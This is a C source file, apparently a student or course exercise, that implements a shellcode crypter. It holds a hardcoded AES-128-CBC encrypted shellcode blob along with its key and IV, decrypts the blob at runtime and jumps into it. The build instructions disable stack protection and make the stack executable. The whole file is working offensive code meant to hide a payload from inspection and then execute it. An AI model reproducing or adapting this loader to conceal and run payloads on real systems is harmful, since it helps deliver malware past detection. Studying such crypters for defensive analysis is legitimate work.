/*
* Author	: RIZAL MUHAMMED (UB3RSiCK)
* Description	: Decrypts AES-RIJNDAEL-128-CBC Encrypted shellcode and Executes
* Filename	: AESCrypter.c
*
* sudo apt-get install libmcrypt-dev
* gcc AESDeCryptExec.c -o AESDeCryptExec -lmcrypt -fno-stack-protector -z execstack
*
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <mcrypt.h>

#include <math.h>
#include <stdint.h>
#include <stdlib.h>

// Function that Decrypts the shellcode
int AES_DECRYPT(
    void* buffer,
    int buffer_len,
    char* IV, 
    char* key,
    int key_len 
){
  /*
  *	 mcrypt_module_open function associates the algorithm and the mode specified [Algorithm: rijndael-128, mode: CBC]
  *	 Returns an encryption descriptor, or MCRYPT_FAILED on error
  */
  MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);

  // buffer_len should be k*algorithms_block_size if used in a mode which operated in blocks (cbc, ecb, nofb)
  if( buffer_len % blocksize != 0 ){return 1;}
  
  // initializes all buffers for the specified thread
  mcrypt_generic_init(td, key, key_len, IV);
 
  // The decryption function. Returns 0 on success. 
  mdecrypt_generic(td, buffer, buffer_len);

  // This function terminates encryption specified by the encryption descriptor (td). Actually it clears all buffers.
  mcrypt_generic_deinit (td);

  // This function closes the modules used by the descriptor td.
  mcrypt_module_close(td);
  
  return 0;
}

int main()
{
  MCRYPT td;

  // Encrypted shellcode
  char * encr_shellcode = \
  "\xb4\x35\x28\x01\x6b\xfc\xf1\x8d\x01\x06\xf3\xc7\x23\x3e\xdd\xd9\x54\xc4\xa2\xa1\xe9\x9f\x2e\x67\x7c\x88\xae\x58\x5d\x40\x32\x3a\x74\x0b\xe6\x49\xd8\xa6\x16\x8c\x4b\x90\x6b\xd5\xfb\x7f\x2c\x95\x68\xcc\x91\xf4\xe7\xea\x8e\x9c\xc6\x4c\xb7\x72\x3b\x8d\x51\x50";
  
  int ctr;
  int shellcode_len;
  shellcode_len = strlen(encr_shellcode);
 
  // Initializaion Vector
  char* IV = "BLEHBLAHBLEHBLAH";

  // Encryption Key
  char *key = "ub3r53cr3t435k3y";
  int keysize = 16; /* 128 bits */
  char* buffer;

  // must be larger than or equal to shellcode length and should be k*algorithms_block_size if used in a mode which operated in blocks (cbc, ecb, nofb)
  // CBC in this case
  int buffer_len = 64;

  buffer = calloc(1, buffer_len);
  strncpy(buffer, encr_shellcode, buffer_len);

  int (*ret)() = (int(*)())buffer;

  // Display the encrypted shellcode
  printf("\n==Encrypted Shellcode==\n");
  for(ctr=0;ctr<shellcode_len;ctr++){
	printf("\\x%02x", encr_shellcode[ctr]&0xff);
  }
  printf("\n");

  // Decrypt Buffer
  AES_DECRYPT(buffer, buffer_len, IV, key, keysize);
  printf("\n==Decrypted Shellcode==\n");
  for(ctr=0;ctr<shellcode_len;ctr++){
	printf("\\x%02x", buffer[ctr]&0xff);
  }

  printf("\n\n==Jumping to Decrypted Payload==\n");
  ret();
}
